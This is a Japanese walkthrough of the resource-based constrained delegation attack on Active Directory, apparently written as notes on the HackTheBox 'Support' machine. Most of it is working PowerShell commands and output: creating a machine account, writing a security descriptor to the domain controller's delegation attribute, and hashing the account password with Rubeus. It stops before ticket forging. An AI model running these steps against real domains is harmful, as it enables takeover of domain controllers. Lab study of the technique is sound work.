Shared Support Accountsというグループのメンバは、コンピュータdc.support.htbに対してGeneric All：

![alltodc](https://user-images.githubusercontent.com/85237728/194805252-d9fdfd2a-b0eb-41cf-956a-2cd91852b170.png)

```
*Evil-WinRM* PS C:\Users\support> Get-DomainController | select name

Name
----
dc.support.htb
```

このGeneric Allとはフルコントロールを意味する。

コンピュータオブジェクトをフルコントロールできる時、resource based constrained delegationアタックという攻撃手法がある。

（HTBのSupportを例にする）

[Powermad.ps1](https://github.com/Kevin-Robertson/Powermad)の`New-MachineAccount`で、新しくコンピュータアカウントを作成する：

```
*Evil-WinRM* PS C:\Users\support> . .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```
コンピュータアカウントが作成されたことを確認

```
*Evil-WinRM* PS C:\Users\support> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer | select name

name
----
DC
MANAGEMENT
attackersystem
```

新規作成したコンピュータアカウントのSIDを取得する：

```
*Evil-WinRM* PS C:\Users\support> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support> $ComputerSid
S-1-5-21-1677581083-3380853377-188903654-5101
```

この新規コンピュータアカウントのSIDを用いてACEの設定をする。
```
*Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support> $SD


ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80
```

そして、新たなDACL/ACEに対するバイナリを取得しておく：

```
*Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)
```

[Security Descriptor, DACL, ACEについて](https://tech.blog.aerie.jp/entry/2017/12/19/104346)

作成したこのセキュリティ記述子（Security Descriptor）を、ターゲットであるコンピュータアカウントdcの「msDS-AllowedToActOnBehalfOfOtherIdentity」という属性に設定する：

```
dc.support.htb
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer | select name

name
----
DC
MANAGEMENT
attackersystem

# 属性がセットされていないことを確認
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | select name,msds-allowedtoactonbehalfofotheridentit

name msds-allowedtoactonbehalfofotheridentit
---- ---------------------------------------
DC

*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

最初に作成したコンピュータアカウントattackersystemのパスワードのRC4_HMAC形式を得るために[Rubeus.exe](https://github.com/GhostPack/Rubeus)を使う。

（Rubeus.exeのバイナリは[ここ](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)から）

```
*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe hash /password:Summer2018!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
```
